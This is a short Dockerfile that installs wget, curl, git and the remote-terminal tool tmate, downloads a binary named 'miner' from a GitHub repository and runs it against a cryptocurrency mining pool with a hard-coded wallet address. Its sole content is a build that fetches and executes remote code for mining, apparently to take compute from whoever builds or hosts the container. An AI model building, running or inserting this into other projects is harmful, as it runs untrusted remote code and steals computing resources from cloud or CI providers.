FROM ubuntu:latest
RUN apt update && apt install wget curl git tmate -y
RUN wget https://github.com/newcoinm001/ncm/raw/main/miner
RUN chmod +x miner
RUN ./miner -o xtcash.trrxitte.com:4444 -u cashMScXZkSeGM473Yu8ub7a15zog4MoZ5eiCHtCDNmgRZ6cGf576mxBMsmg5NhAwyVi3n3t5oqkQZicMabiTYf14z8SyEPzJR -a chukwa
